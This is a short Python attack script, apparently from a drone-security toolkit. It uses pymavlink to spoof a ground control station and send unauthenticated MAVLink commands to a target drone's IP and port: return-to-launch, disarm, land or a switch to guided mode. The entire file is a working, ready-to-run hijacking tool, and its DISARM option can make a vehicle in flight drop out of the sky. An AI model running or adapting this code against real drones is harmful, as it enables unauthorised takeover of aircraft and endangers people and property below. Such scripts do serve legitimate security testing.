#!/usr/bin/env python3
"""
Command Injection Attack Module

Sends dangerous commands (RTL, DISARM, LAND, etc.)
"""
import time
import sys
from pymavlink import mavutil

def attack_command_injection(mav, command_type: str = "RTL"):
    """
    Send dangerous command
    
    Args:
        mav: MAVLink connection
        command_type: RTL, DISARM, LAND, MODE_GUIDED
    """
    print(f"[COMMAND INJECT] Sending {command_type} command...")
    
    try:
        if command_type == "RTL":
            mav.mav.command_long_send(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                confirmation=0,
                param1=0, param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            
        elif command_type == "DISARM":
            print("[COMMAND INJECT] ⚠️  WARNING: DISARM is DANGEROUS!")
            mav.mav.command_long_send(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                confirmation=0,
                param1=0,  # 0 = disarm
                param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            
        elif command_type == "LAND":
            mav.mav.command_long_send(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_NAV_LAND,
                confirmation=0,
                param1=0, param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            
        elif command_type == "MODE_GUIDED":
            mav.mav.set_mode_send(
                target_system=1,
                base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                custom_mode=4  # GUIDED mode
            )
        
        print(f"[COMMAND INJECT] {command_type} command sent!")
        
    except Exception as e:
        print(f"[COMMAND INJECT] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python command_injection.py <target_ip> <target_port> [command_type]")
        print("Commands: RTL, DISARM, LAND, MODE_GUIDED")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    command_type = sys.argv[3] if len(sys.argv) > 3 else "RTL"
    
    connection_string = f'udpout:{target_ip}:{target_port}'
    mav = mavutil.mavlink_connection(connection_string, source_system=255, source_component=190)
    
    time.sleep(1)
    attack_command_injection(mav, command_type)
